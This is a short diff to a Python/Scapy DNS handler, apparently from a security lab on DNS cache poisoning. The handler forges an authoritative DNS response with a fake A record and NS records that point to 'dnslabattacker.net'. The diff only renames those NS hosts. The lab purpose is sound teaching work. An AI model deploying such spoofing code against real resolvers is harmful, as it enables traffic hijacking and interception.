@@ -52,7 +52,7 @@ def handler(data, dns_ip, dns_port, SPOOF):
         # answer's rdata should be the thing that we change
         # answer's domain name should be consistent with the question
         fake_answer = DNSRR(rrname = query[DNSQR].qname, type='A', rdata="1.2.3.4")
-        fake_ns = DNSRR(rrname = query[DNSQR].qname, type='NS', rdata="ns1.dnslabattacker.net")/DNSRR(rrname = query[DNSQR].qname, type='NS', rdata="ns2.dnslabattacker.net")
+        fake_ns = DNSRR(rrname = query[DNSQR].qname, type='NS', rdata="ns.dnslabattacker.net")/DNSRR(rrname = query[DNSQR].qname, type='NS', rdata="ns.dnslabattacker.net")
         response = DNS(id = query.id, qr = 1, aa = 1, tc = query.tc, rd = query.rd, ra = query.ra, z = query.z, rcode = query.rcode,
                         qd = query.qd, an = fake_answer, ancount = 1, ns = fake_ns, nscount = 2, arcount = 0)
         return bytes(response)
